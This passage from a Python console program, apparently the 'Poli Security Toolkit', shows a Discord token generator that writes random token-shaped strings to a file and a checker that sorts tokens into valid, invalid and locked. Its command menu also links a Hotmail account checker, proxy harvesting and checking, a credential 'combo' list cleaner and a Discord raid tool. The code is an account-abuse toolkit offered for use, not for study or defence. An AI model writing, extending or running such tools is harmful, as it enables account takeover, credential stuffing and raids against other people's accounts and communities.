            return
            
        output_dir = choose_directory("Select output directory")
        if not output_dir:
            return
            
        file_name = os.path.join(output_dir, f"tokens_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
        
        print(Colorate.Horizontal(Colors.blue_to_cyan, f"Generating {num_tokens} tokens..."))
        generate_tokens_and_save(num_tokens, file_name)
        print(Colorate.Horizontal(Colors.blue_to_cyan, f"Tokens saved to: {file_name}"))
        
    except ValueError:
        print(Colorate.Horizontal(Colors.blue_to_cyan, "Please enter a valid number"))
    
    colored_input("\n┌─[beta@poli]\n└──╼ Press Enter to return to the main menu... ")

def generate_token():
    
    user_id = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(18, 20)))
    
    
    timestamp = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    
    
    hmac = ''.join(random.choices(string.ascii_letters + string.digits + "_", k=27))
    
    
    token = f"{user_id}.{timestamp}.{hmac}"
    
    return token

def generate_tokens_and_save(num_tokens, file_name):
    with open(file_name, 'w') as file:
        for _ in range(num_tokens):
            token = generate_token()
            file.write(token + '\n')
    gradient_print(f"{num_tokens} tokens successfully saved to '{file_name}'.", 'success_gradient')

def token_checker():
    clear_console()
    print_ascii_art()
    gradient_print(Center.XCenter("="*50), 'main_gradient')
    gradient_print(Center.XCenter("DISCORD TOKEN CHECKER"), 'main_gradient')
    gradient_print(Center.XCenter("="*50), 'main_gradient')
    
    if not tokenchecker_available:
        gradient_print(Center.XCenter("Token checker module not available."), 'error_gradient')
        gradient_print(Center.XCenter("Make sure tokenchecker.py is in the same directory."), 'warning_gradient')
        colored_input("\n┌─[poli@security]\n└──╼ Press Enter to return to the main menu... ")
        return
    
    gradient_print("\nSelect a file containing Discord tokens (one per line)", 'highlight_gradient')
    file_path = choose_file("Select token file", [('Text Files', '*.txt')])
    
    if not file_path:
        gradient_print("No file selected.", 'error_gradient')
        colored_input("\n┌─[poli@security]\n└──╼ Press Enter to return to the main menu... ")
        return
    
    gradient_print(f"\nChecking tokens from: {file_path}", 'highlight_gradient')
    gradient_print("This may take some time depending on the number of tokens.", 'secondary_gradient')
    
    def update_progress(current, total):
        colors = Colors
        progress = int(current / total * 100)
        bar_width = 50
        filled_width = int(bar_width * current / total)
        bar = '█' * filled_width + ' ' * (bar_width - filled_width)
        sys.stdout.write(f"\r[{Colorate.Horizontal(colors.purple, bar)}] {progress}% ({current}/{total} tokens checked)")
        sys.stdout.flush()
    
    try:
        os.makedirs("output", exist_ok=True)
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        results = loop.run_until_complete(check_tokens_from_file(file_path, update_progress))
        loop.close()
        
        print()
        
        gradient_print(f"\nToken check completed!", 'success_gradient')
        gradient_print(f"Results saved to the 'output' folder:", 'highlight_gradient')
        gradient_print(f"  - Valid tokens: {results['valid']} (saved to output/valid.txt)", 'success_gradient')
        gradient_print(f"  - Invalid tokens: {results['invalid']} (saved to output/invalid.txt)")
        gradient_print(f"  - Locked tokens: {results['locked']} (saved to output/locked.txt)")
        gradient_print(f"  - Error tokens: {results['error']} (saved to output/error.txt)")
        gradient_print(f"  - Total tokens checked: {results['total']}")
        
    except Exception as e:
        gradient_print(f"\nAn error occurred during token checking: {str(e)}")
    
    colored_input("\n┌─[poli@security]\n└──╼ Press Enter to return to the main menu... ")

def title_changer():
    chars = string.ascii_letters + string.digits + string.punctuation
    
    while True:
        try:
            random_title = ''.join(random.choice(chars) for _ in range(8))
            ctypes.windll.kernel32.SetConsoleTitleW(random_title)
            time.sleep(0.1)
        except:
            break

def check_dependencies():
    dependencies = [
        ("requests", "Network Communication"),
        ("pystyle", "UI Styling"),
        ("Crypto.Cipher", "Encryption"),
        ("selenium", "Web Automation"),
        ("discord", "Discord Integration"),
        ("wmi", "System Information")
    ]
    
    results = []
    for module, description in dependencies:
        try:
            __import__(module.split('.')[0])
            results.append((module, description, True))
        except ImportError:
            results.append((module, description, False))
    
    return results

def select_mode():
    clear_console()
    print_ascii_art()
    gradient_print(Center.XCenter("="*50))
    gradient_print(Center.XCenter("SELECT OPERATION MODE"))
    gradient_print(Center.XCenter("="*50))
    print()
    
    gradient_print(Center.XCenter("Please select the operation mode:"))
    print()
    gradient_print(Center.XCenter("[1] User Mode - Basic features only"))
    gradient_print(Center.XCenter("[2] Dev Mode - All features including advanced tools"))
    print()
    
    while True:
        mode = colored_input("\n┌─[poli@security]\n└──╼ Enter mode (1 or 2): ").strip()
        if mode == "1":
            return "user"
        elif mode == "2":
            return "dev"
        else:
            gradient_print("Invalid selection. Please enter 1 or 2.")

def print_loading_animation():
    
    loading_art = """
                                         _.oo.
                 _.u[[/;:,.         .odMMMMMM'
              .o888UU[[[/;:-.  .o@P^    MMM^
             oN88888UU[[[/;::-.        dP^
            dNMMNN888UU[[/;:--.   .o@P^
           ,MMMMMMN888UU[[/;::-. o@^
           NNMMMNN888UU[[[/~.o@P^
           888888888UU[[[/o@^-..
          oI8888UU[[[/o@P^:--.. 
       .@^  YUU[[[/o@^;::---.. 
     oMP     ^/o@P^;:::---.. 
  .dMMM    .o@^ ^;::---... 
 dMMMMMMM@^`       `^^^^ 
YMMMUP^ 
 ^^ 
"""
    
    colors = Colors
    print(Colorate.Diagonal(colors.blue_to_cyan, loading_art))
    print()
    print(Colorate.Horizontal(colors.blue_to_cyan, "Initializing Poli Security Toolkit..."))
    print()
    
    
    dependencies = [
        ("selenium", "Web automation", selenium_available),
        ("discord.py", "Discord integration", True),
        ("requests", "HTTP requests", True),
        ("pystyle", "Colorful output", True)
    ]
    
    for i in range(101):
        time.sleep(0.01)
        progress = '█' * int(50 * i / 100)
        spaces = " " * (50 - int(50 * i / 100))
        
        
        sys.stdout.write(f"\r[{Colorate.Horizontal(colors.blue_to_cyan, progress)}{spaces}] {i}%")
        sys.stdout.flush()
        
        
        if i == 10:
            print(f"\n{Colorate.Horizontal(colors.blue_to_cyan, '→ Checking system compatibility...')}")
        elif i == 25:
            print(f"\n{Colorate.Horizontal(colors.blue_to_cyan, '→ Verifying file integrity...')}")
        elif i == 40:
            print(f"\n{Colorate.Horizontal(colors.blue_to_cyan, '→ Checking dependencies...')}")
            
            
            for idx, (module, description, status) in enumerate(dependencies):
                status_text = Colorate.Horizontal(colors.blue_to_cyan, "✓ INSTALLED") if status else Colorate.Horizontal(colors.red, "✗ MISSING")
                print(f"  {module} ({description}): {status_text}")
                time.sleep(0.2)
        elif i == 70:
            print(f"\n{Colorate.Horizontal(colors.blue_to_cyan, '→ Initializing security protocols...')}")
        elif i == 85:
            print(f"\n{Colorate.Horizontal(colors.blue_to_cyan, '→ Preparing interface...')}")
        elif i == 95:
            print(f"\n{Colorate.Horizontal(colors.blue_to_cyan, '→ All systems ready!')}")
        
        
        if i < 30:
            time.sleep(0.05)
        elif i < 60:
            time.sleep(0.1)
        else:
            time.sleep(0.15)
    
    
    missing_deps = [module for module, _, status in dependencies if not status]
    if missing_deps:
        print(Colorate.Horizontal(colors.red, "⚠ WARNING: Some dependencies are missing!"))
        print(Colorate.Horizontal(colors.red, "Some features may not work properly."))
        print()
        time.sleep(1.5)
    
    print("\n" * 3)

    
    mode = select_mode()
    return mode

def main():
    
    title_thread = threading.Thread(target=title_changer, daemon=True)
    title_thread.start()
    
    
    mode = print_loading_animation()
    
    
    clear_console()
    print_ascii_art()
    
    
    if mode == "dev":
        
        command_map = {
            "hotmail": hotmail_checker,
            "harvest": proxy_harvester,
            "proxycheck": proxy_checker,
            "rarsearcher": rarsearcher,
            "txtsearcher": txtsearcher,
            "combocleaner": combocleaner,
            "usersearch": username_search_tool,
            "raid": discord_raid_tool,
            "tokengen": discord_token_generator,
            "tokenchecker": token_checker,
            "help": lambda: print_help_menu(mode),
            "clear": clear_console,
            "exit": lambda: "exit"
        }
        gradient_print(Center.XCenter("DEVELOPER MODE ACTIVE - ALL FEATURES ENABLED"), 'main_gradient')
    else:
        
        command_map = {
            "rarsearcher": rarsearcher,
            "txtsearcher": txtsearcher,
            "combocleaner": combocleaner,
            "usersearch": username_search_tool,
            "raid": discord_raid_tool,
            "tokengen": discord_token_generator,
            "tokenchecker": token_checker,
            "help": lambda: print_help_menu(mode),
            "clear": clear_console,
            "exit": lambda: "exit"
        }
        gradient_print(Center.XCenter("USER MODE ACTIVE - BASIC FEATURES ONLY"), 'main_gradient')
    
    while True:
        try:
            command = colored_input("\n┌─[poli@security]\n└──╼ ").strip().lower()
            
            if command in command_map:
                if command == "exit":
                    clear_console()
                    gradient_print("Thank you for using POLI!")
                    break
                elif command == "clear":
                    clear_console()
                    print_ascii_art()
                elif command == "help":
                    clear_console()
                    print_ascii_art()
                    print_help_menu(mode)
                else:
                    
                    command_map[command]()
                    
                    clear_console()
                    print_ascii_art()
            else:
                print(f"Command not found: {command}. Type 'help' for available commands.")
                
        except KeyboardInterrupt:
            clear_console()
            print("Program interrupted. Exiting...")
            break
        except Exception as e:
            print(f"An error occurred: {str(e)}")
            colored_input("\n┌─[poli@security]\n└──╼ Press Enter to continue... ")

if __name__ == "__main__":
    main()
